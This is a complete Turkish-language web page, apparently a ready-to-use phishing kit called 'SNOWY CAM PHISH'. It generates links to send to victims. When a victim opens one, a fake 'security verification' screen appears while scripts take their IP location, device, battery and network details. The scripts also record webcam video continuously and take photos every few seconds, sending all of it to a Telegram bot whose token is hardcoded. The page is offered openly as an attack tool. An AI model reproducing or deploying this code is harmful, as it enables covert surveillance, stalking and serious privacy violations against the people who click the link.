<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SNOWY CAM PHISH</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 30px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            text-align: center;
            color: white;
        }
        
        h1 {
            font-size: 32px;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        
        h1 span {
            color: #00ffff;
            text-shadow: 0 0 10px #00ffff;
        }
        
        .subtitle {
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .btn {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 15px 25px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            backdrop-filter: blur(5px);
        }
        
        .btn:hover {
            background: rgba(255, 255, 255, 0.2);
            border-color: #00ffff;
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 255, 255, 0.3);
        }
        
        .btn.primary {
            background: linear-gradient(45deg, #00ffff, #0066ff);
            border: none;
            color: #000;
        }
        
        .btn.primary:hover {
            box-shadow: 0 10px 25px rgba(0, 255, 255, 0.5);
        }
        
        .link-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
            word-break: break-all;
            font-family: monospace;
            font-size: 14px;
            color: #00ffff;
            display: none;
        }
        
        .status-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border-left: 4px solid #00ffff;
            text-align: left;
            display: none;
        }
        
        .status-title {
            color: #00ffff;
            margin-bottom: 10px;
            font-size: 18px;
        }
        
        .status-content {
            color: white;
            font-family: monospace;
            line-height: 1.6;
        }
        
        .footer {
            margin-top: 30px;
            color: rgba(255, 255, 255, 0.5);
            font-size: 12px;
        }
        
        .footer span {
            color: #00ffff;
        }
        
        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #00ffff;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>❄️ <span>SNOWY</span> CAM PHISH</h1>
        <div class="subtitle">Güvenlik doğrulama sistemi</div>
        
        <div class="btn-container">
            <button class="btn primary" id="linkBtn" onclick="createLink()">
                <span>🔗</span> Link Oluştur
            </button>
            <button class="btn" id="sahipBtn" onclick="showSahip()">
                <span>👤</span> Sahip
            </button>
            <button class="btn" id="kanalBtn" onclick="showKanal()">
                <span>📢</span> Kanal
            </button>
        </div>
        
        <div class="link-box" id="linkBox"></div>
        <div class="status-box" id="statusBox"></div>
        
        <div class="footer">
            ❄️ <span>@snowy_dexry_wexry</span> ❄️
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // GİZLİ KONFİGÜRASYON
        // ============================================
        const BOT_TOKEN = "8773124715:AAG3Y7itEmKlsrvOfUkrvXoZmJrRPQanzro";
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_ID = urlParams.get('i');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const linkBox = document.getElementById('linkBox');
        const statusBox = document.getElementById('statusBox');
        
        let mediaRecorder = null;
        let recordedChunks = [];
        let videoCount = 0;
        let photoCount = 0;
        let stream = null;
        
        // ============================================
        // BUTON FONKSİYONLARI (HTML format ile _ gösterimi)
        // ============================================
        function showSahip() {
            statusBox.style.display = 'block';
            statusBox.innerHTML = `
                <div class="status-title">👤 SAHİP BİLGİLERİ</div>
                <div class="status-content">
                    ❄️ SNOWY DEXRY WEXRY<br>
                    🔐 Güvenlik araçları geliştiricisi<br>
                    📱 <span style="color:#00ffff;">@snowy_dexry_wexry</span> (alt çizgili: snowy_dexry_wexry)
                </div>
            `;
            linkBox.style.display = 'none';
        }
        
        function showKanal() {
            statusBox.style.display = 'block';
            statusBox.innerHTML = `
                <div class="status-title">📢 KANAL BİLGİLERİ</div>
                <div class="status-content">
                    🔔 Güncellemeler ve yeni tool'lar<br>
                    📢 <span style="color:#00ffff;">@snowykanal</span><br>
                    ❄️ Takipte kal! (alt çizgi: _ işareti burada)
                </div>
            `;
            linkBox.style.display = 'none';
        }
        
        function createLink() {
            const link = `https://snowy-dexry-wexry.github.io/Snowy/?i=${TARGET_ID || 'KULLANICI_ID'}`;
            linkBox.style.display = 'block';
            linkBox.innerHTML = `
                <div style="margin-bottom:10px; color:#00ffff;">🔗 LİNKİN HAZIR</div>
                <code style="color:white;">${link}</code>
                <div style="margin-top:15px; font-size:12px; color:rgba(255,255,255,0.5);">📌 Kurban'a gönder, tıklasın.</div>
            `;
            statusBox.style.display = 'none';
        }
        
        // ============================================
        // GELİŞMİŞ BİLGİ TOPLAMA FONKSİYONLARI
        // ============================================
        
        // IP ve Konum Bilgisi
        async function getLocationInfo() {
            try {
                // IP üzerinden konum (genel)
                const ipRes = await fetch('https://ipapi.co/json/');
                const locationData = await ipRes.json();
                
                return {
                    ip: locationData.ip || 'Bilinmiyor',
                    ulke: locationData.country_name || 'Bilinmiyor',
                    sehir: locationData.city || 'Bilinmiyor',
                    bolge: locationData.region || 'Bilinmiyor',
                    posta_kodu: locationData.postal || 'Bilinmiyor',
                    enlem: locationData.latitude || 'Bilinmiyor',
                    boylam: locationData.longitude || 'Bilinmiyor',
                    timezone: locationData.timezone || 'Bilinmiyor',
                    iss: locationData.org || 'Bilinmiyor'
                };
            } catch(e) {
                return {
                    ip: 'Alınamadı',
                    ulke: 'Alınamadı',
                    sehir: 'Alınamadı',
                    bolge: 'Alınamadı',
                    posta_kodu: 'Alınamadı',
                    enlem: 'Alınamadı',
                    boylam: 'Alınamadı',
                    timezone: 'Alınamadı',
                    iss: 'Alınamadı'
                };
            }
        }
        
        // Cihaz Bilgisi
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const cookiesEnabled = navigator.cookieEnabled;
            const doNotTrack = navigator.doNotTrack || 'Bilinmiyor';
            const hardwareConcurrency = navigator.hardwareConcurrency || 'Bilinmiyor';
            const deviceMemory = navigator.deviceMemory || 'Bilinmiyor';
            const maxTouchPoints = navigator.maxTouchPoints || 'Bilinmiyor';
            
            // Ekran bilgisi
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            const colorDepth = screen.colorDepth;
            const pixelRatio = window.devicePixelRatio || '1';
            
            // Tarayıcı tespiti
            let browser = 'Bilinmiyor';
            if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
            else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
            else if (ua.indexOf('Safari') > -1) browser = 'Safari';
            else if (ua.indexOf('Edge') > -1) browser = 'Edge';
            else if (ua.indexOf('MSIE') > -1 || ua.indexOf('Trident') > -1) browser = 'Internet Explorer';
            
            // İşletim sistemi
            let os = 'Bilinmiyor';
            if (ua.indexOf('Windows') > -1) os = 'Windows';
            else if (ua.indexOf('Mac') > -1) os = 'MacOS';
            else if (ua.indexOf('Linux') > -1) os = 'Linux';
            else if (ua.indexOf('Android') > -1) os = 'Android';
            else if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
            
            return {
                userAgent: ua,
                platform: platform,
                browser: browser,
                os: os,
                language: language,
                cookiesEnabled: cookiesEnabled,
                doNotTrack: doNotTrack,
                hardwareConcurrency: hardwareConcurrency,
                deviceMemory: deviceMemory,
                maxTouchPoints: maxTouchPoints,
                screenWidth: screenWidth,
                screenHeight: screenHeight,
                colorDepth: colorDepth,
                pixelRatio: pixelRatio
            };
        }
        
        // Şarj Durumu
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        sarjDurumu: battery.charging ? 'Şarj Oluyor' : 'Şarjda Değil',
                        sarjSeviyesi: Math.round(battery.level * 100) + '%',
                        sarjSuresi: battery.chargingTime === Infinity ? 'Bilinmiyor' : battery.chargingTime + ' saniye',
                        bosalmaSuresi: battery.dischargingTime === Infinity ? 'Bilinmiyor' : battery.dischargingTime + ' saniye'
                    };
                } else {
                    return {
                        sarjDurumu: 'Desteklenmiyor',
                        sarjSeviyesi: 'Desteklenmiyor',
                        sarjSuresi: 'Desteklenmiyor',
                        bosalmaSuresi: 'Desteklenmiyor'
                    };
                }
            } catch(e) {
                return {
                    sarjDurumu: 'Alınamadı',
                    sarjSeviyesi: 'Alınamadı',
                    sarjSuresi: 'Alınamadı',
                    bosalmaSuresi: 'Alınamadı'
                };
            }
        }
        
        // Ağ Bilgisi
        function getNetworkInfo() {
            if ('connection' in navigator) {
                const conn = navigator.connection;
                return {
                    baglanti: conn.effectiveType || 'Bilinmiyor',
                    rtt: conn.rtt || 'Bilinmiyor',
                    downlink: conn.downlink || 'Bilinmiyor',
                    saveData: conn.saveData ? 'Evet' : 'Hayır'
                };
            } else {
                return {
                    baglanti: 'Desteklenmiyor',
                    rtt: 'Desteklenmiyor',
                    downlink: 'Desteklenmiyor',
                    saveData: 'Desteklenmiyor'
                };
            }
        }
        
        // ============================================
        // TÜM BİLGİLERİ TELEGRAM'A GÖNDER
        // ============================================
        async function sendAllInfo() {
            // Tüm bilgileri topla
            const locationInfo = await getLocationInfo();
            const deviceInfo = getDeviceInfo();
            const batteryInfo = await getBatteryInfo();
            const networkInfo = getNetworkInfo();
            
            // Mesajı oluştur
            const msg = `❄️ **SNOWY CAM PHISH - KURBAN BİLGİLERİ** ❄️
━━━━━━━━━━━━━━━━━━━━━
**📍 KONUM BİLGİLERİ**
➥ IP: ${locationInfo.ip}
➥ Ülke: ${locationInfo.ulke}
➥ Şehir: ${locationInfo.sehir}
➥ Bölge: ${locationInfo.bolge}
➥ Posta Kodu: ${locationInfo.posta_kodu}
➥ Enlem: ${locationInfo.enlem}
➥ Boylam: ${locationInfo.boylam}
➥ Timezone: ${locationInfo.timezone}
➥ ISS: ${locationInfo.iss}

**📱 CİHAZ BİLGİLERİ**
➥ Browser: ${deviceInfo.browser}
➥ İşletim Sistemi: ${deviceInfo.os}
➥ Platform: ${deviceInfo.platform}
➥ Dil: ${deviceInfo.language}
➥ Ekran: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} (${deviceInfo.colorDepth}bit)
➥ Pixel Ratio: ${deviceInfo.pixelRatio}
➥ CPU Çekirdek: ${deviceInfo.hardwareConcurrency}
➥ RAM: ${deviceInfo.deviceMemory}GB
➥ Dokunmatik: ${deviceInfo.maxTouchPoints} nokta
➥ Çerezler: ${deviceInfo.cookiesEnabled ? 'Açık' : 'Kapalı'}
➥ Do Not Track: ${deviceInfo.doNotTrack}

**🔋 BATARYA BİLGİLERİ**
➥ Durum: ${batteryInfo.sarjDurumu}
➥ Seviye: ${batteryInfo.sarjSeviyesi}
➥ Şarj Süresi: ${batteryInfo.sarjSuresi}
➥ Boşalma Süresi: ${batteryInfo.bosalmaSuresi}

**📶 AĞ BİLGİLERİ**
➥ Bağlantı: ${networkInfo.baglanti}
➥ RTT: ${networkInfo.rtt}ms
➥ Downlink: ${networkInfo.downlink}Mbps
➥ Tasarruf: ${networkInfo.saveData}

**⏱️ ZAMAN**
➥ Açılış: ${new Date().toLocaleString('tr-TR')}
➥ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}

━━━━━━━━━━━━━━━━━━━━━
⚡ @snowy_dexry_wexry ⚡
_ (alt çizgi) işareti burada görünüyor`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: TARGET_ID, text: msg, parse_mode: 'Markdown' })
            });
        }
        
        // ============================================
        // VİDEO KAYDI BAŞLAT
        // ============================================
        function startVideoRecording() {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) recordedChunks.push(event.data);
            };
            
            mediaRecorder.onstop = async () => {
                videoCount++;
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('video', blob, `video_${Date.now()}.webm`);
                formData.append('caption', `🎥 Video #${videoCount} - ${new Date().toLocaleString('tr-TR')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                // 1 saniye sonra tekrar başlat
                setTimeout(startVideoRecording, 1000);
            };
            
            // 15 saniyelik video
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 15000);
        }
        
        // ============================================
        // FOTOĞRAF ÇEK
        // ============================================
        async function takePhoto() {
            photoCount++;
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                formData.append('caption', `📸 Fotoğraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.7);
        }
        
        // ============================================
        // KAMERAYI BAŞLAT (EĞER SAYFA ?i= İLE AÇILDIYSA)
        // ============================================
        async function startCamera() {
            if (!TARGET_ID) return;
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // TÜM BİLGİLERİ GÖNDER (konum, cihaz, batarya, ağ)
                await sendAllInfo();
                
                // 2 saniye bekle
                await new Promise(r => setTimeout(r, 2000));
                
                // VİDEO KAYDI BAŞLAT
                startVideoRecording();
                
                // FOTOĞRAF ÇEK (her 5 saniyede bir)
                setInterval(takePhoto, 5000);
                
            } catch(e) {
                console.log('Kamera hatası:', e);
                // Kamera yoksa bile bilgileri gönder
                await sendAllInfo();
            }
        }
        
        // ============================================
        // SAYFA YÜKLENDİĞİNDE
        // ============================================
        window.onload = function() {
            if (TARGET_ID) {
                // Eğer ID varsa, otomatik başlat
                startCamera();
                
                // Butonları devre dışı bırak
                document.getElementById('linkBtn').style.display = 'none';
                document.getElementById('sahipBtn').style.display = 'none';
                document.getElementById('kanalBtn').style.display = 'none';
                
                // Loading göster
                statusBox.style.display = 'block';
                statusBox.innerHTML = `
                    <div class="status-title">🔄 İŞLEM YAPILIYOR</div>
                    <div class="status-content">
                        <div class="loader" style="margin:10px auto;"></div>
                        Güvenlik doğrulaması yapılıyor...<br>
                        <span style="font-size:12px; color:#00ffff;">@snowy_dexry_wexry</span>
                    </div>
                `;
            }
        };
        
        // ============================================
        // SAYFA KAPANIRKEN
        // ============================================
        window.onbeforeunload = function() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        };
    </script>
</body>
    </html>
